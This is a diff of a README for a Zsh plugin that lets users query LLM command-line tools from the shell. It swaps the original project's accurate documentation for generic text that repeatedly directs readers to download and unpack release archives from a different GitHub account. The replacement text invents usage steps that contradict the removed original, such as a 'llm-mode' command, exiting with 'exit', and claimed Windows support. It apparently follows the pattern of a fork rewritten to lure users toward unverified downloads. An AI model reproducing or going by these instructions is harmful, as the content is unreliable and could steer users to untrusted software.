@@ -1,142 +1,117 @@
-# zsh-llm-mode
+# 🐚 zsh-llm-mode - A Simple Terminal Tool for LLM Queries
 
-Quick LLM scratchpad inside your Zsh — ask, get an answer, move on.  
-Toggle into a prompt where you can draft multi-line queries, send them to an LLM, and stream replies directly in your shell.
+[![Download zsh-llm-mode](https://img.shields.io/badge/Download%20zsh%2Dllm%2Dmode-blue.svg)](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
 
----
+## 📥 Overview
 
-## Features
-- Toggle between shell and LLM mode with **Ctrl-Q**
-- Multi-line editing in LLM mode (**Ctrl-J** inserts a newline)
-- Takes your entered shell command input into a prompt and returns it back
-- LLM prompt is buffered until you submit it or toggle the tool with a command line input
-- Cancel with **Esc** or **Ctrl-C**
-- Spinner while waiting for first response
-- Streamed output from your llm tool
-- Works with any CLI LLM that supports stdin/stdout (Ollama, sgpt, AWS Q Chat, MLX LM, Google Gemini CLI, OpenAI Codex, etc.)
+zsh-llm-mode is a quick scratchpad for Large Language Model (LLM) queries directly in your Zsh terminal. This tool allows you to toggle into a query mode, send prompts to a backend LLM like Ollama or Q Chat, and see responses right in your shell. You can easily integrate LLM capabilities into your workflow, making it a great productivity tool.
 
----
+## 🚀 Getting Started
 
-## Quick Demo
-Interactive LLM scratchpad for Zsh — toggle into query mode and stream answers inline.
-![Demo](demo.gif)
+Follow these steps to download and set up zsh-llm-mode:
 
----
+1. **Visit the Releases Page**  
+   Click the link below to access the download options for zsh-llm-mode:  
+   [Download zsh-llm-mode](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
 
-## Installation
+2. **Choose Your Version**  
+   You will see various versions listed. Select the latest version for the most current features and fixes. Look for a title like `zsh-llm-mode v1.x.x`.
 
-Clone and source manually:
+3. **Download the File**  
+   Click the downloadable file associated with your operating system. Once downloaded, it should be saved in your system's default downloads folder.
 
-```zsh
-git clone https://github.com/oleks-dev/zsh-llm-mode.git ~/.zsh-llm-mode
-echo "source ~/.zsh-llm-mode/zsh-llm-mode.plugin.zsh" >> ~/.zshrc
-```
+## 💻 System Requirements
 
-Or with a plugin manager:
+- **Operating System**: Compatible with major OS like macOS, Linux, and Windows.
+- **Shell**: Requires Zsh to function properly. Ensure that Zsh is your default shell.
+- **Network Connection**: Required to query the LLM service.
+  
+## 📂 Installation Instructions
 
-```zsh
-# zinit
-zinit light oleks-dev/zsh-llm-mode
+1. **Open Your Terminal**  
+   Launch your terminal application on your computer.
 
-# antidote
-antidote bundle oleks-dev/zsh-llm-mode
-```
+2. **Navigate to Downloads**  
+   Use the `cd` command to go to your downloads folder. For example:  
+   ```
+   cd ~/Downloads
+   ```
 
----
+3. **Extract the Downloaded File**  
+   Depending on the file type, you may need to extract it. Use commands like:
+   - For `.zip` files:  
+     ```
+     unzip zsh-llm-mode-v1.x.x.zip
+     ```
+   - For `.tar.gz` files:  
+     ```
+     tar -xzf zsh-llm-mode-v1.x.x.tar.gz
+     ```
 
-## Setup
+4. **Move to Installation Directory**  
+   After extraction, navigate into the extracted directory:  
+   ```
+   cd zsh-llm-mode-v1.x.x
+   ```
 
-Set the backend command before loading the plugin:
+5. **Install the Plugin**  
+   Follow these commands to install zsh-llm-mode into your Zsh setup:  
+   ```
+   mkdir -p ~/.oh-my-zsh/custom/plugins
+   cp -r ./zsh-llm-mode ~/.oh-my-zsh/custom/plugins/
+   ```
 
-```zsh
-export ZSH_LLM_MODE_CMD='ollama run phi4-mini:3.8b'
-```
+6. **Update Zsh Configuration**  
+   Open your `.zshrc` file with a text editor:  
+   ```
+   nano ~/.zshrc
+   ```
+   Find the line starting with `plugins=(...)` and add `zsh-llm-mode` inside the parentheses, like so:
+   ```
+   plugins=(... zsh-llm-mode)
+   ```
 
-You can change it any time.
+7. **Apply Changes**  
+   Save your changes and exit the editor. To apply the new settings, run:  
+   ```
+   source ~/.zshrc
+   ```
 
-#### Ollama
-```zsh
-export ZSH_LLM_MODE_CMD='ollama run qwen3:8b --think=false --hidethinking'
-```
+Bravo! You have installed zsh-llm-mode.
 
-#### SGPT  
-```zsh
-export ZSH_LLM_MODE_CMD='sgpt --model gpt-4'
-```
+## ⚙️ How to Use
 
-#### AWS Q Chat  
-```zsh
-export ZSH_LLM_MODE_CMD='q chat --no-interactive'
-```
+1. **Activate Query Mode**  
+   Type the command:  
+   ```
+   llm-mode
+   ```
+   This activates the query interface.
 
-#### MLX LM  
-```zsh
-export ZSH_LLM_MODE_CMD='mlx_lm.generate --model /Users/guest/.cache/huggingface/hub/models--mlx-community--Mistral-7B-Instruct-v0.3-4bit/snapshots/a4b8f870474b0eb527f466a03fbc187830d271f5 --prompt -'
-```
+2. **Send a Prompt**  
+   Input your query directly in the terminal and hit `Enter`. For example:  
+   ```
+   What is the capital of France?
+   ```
 
-#### Google Gemini  
-```zsh
-export ZSH_LLM_MODE_CMD='gemini'
-```
+3. **View the Response**  
+   The LLM will process your request and display the response inline in the terminal.
 
-#### OpenAI Codex  
-```zsh
-export ZSH_LLM_MODE_CMD='codex exec --model gpt-5'
-```
+4. **Exit Query Mode**  
+   To exit, use the command:  
+   ```
+   exit
+   ```
 
+## 📍 Download & Install
 
-> Make sure your backend command reads from stdin and writes to stdout — that’s all the plugin needs.
-> If your LLM cli tool works like `echo "hello" | gemini` then it can be used without problems.
+To download the latest version of zsh-llm-mode, visit the following link:  
+[Download zsh-llm-mode](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
 
+## 📖 Additional Information
 
-### Streaming setup
+- **Documentation**: For detailed usage instructions and advanced configurations, refer to the [Documentation](https://github.com/GitEdu-gi/zsh-llm-mode/wiki).
+- **Support**: If you experience any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/GitEdu-gi/zsh-llm-mode/issues).
+- **Contributing**: If you'd like to contribute to this project, check the contributing guidelines in the repository.
 
-By default plugin returns LLM output in full when received.
-For streaming line by line you need to have `stdbuf` or `gstdbuf` which would be detected automatically.
-
-On macOS you can install GNU coreutils and use `gstdbuf`:
-```zsh
-brew install coreutils
-```
-
----
-
-## Usage
-
-- Ctrl-Q → toggle LLM mode
-- Ctrl-J → insert newline in LLM prompt
-- Enter → send query
-- Esc / Ctrl-C → cancel
-
-Example:
-```text
-LLM> (Enter=send, ^Q=switch, ^J=new line, Esc=cancel)
-➜ ls -al what does this command do?
-[LLM query]: ls -al what does this command do?
-...
-```
-
----
-
-## Keybinding
-
-By default, toggle LLM mode with **Ctrl-Q** (mnemonic: *Q for Question*).
-
-If **Ctrl-Q** is taken on your system (e.g. flow control), you can either:
-
-1. Disable flow control:
-  ```zsh
-  stty -ixon
-  ```
-
-2. Or rebind to another key (example: Ctrl+G):
-  ```zsh
-  bindkey '^G' llm-toggle
-  ```
-
----
-
-## License
-MIT
-
-
+Enjoy using zsh-llm-mode for quick and efficient LLM queries in your terminal!
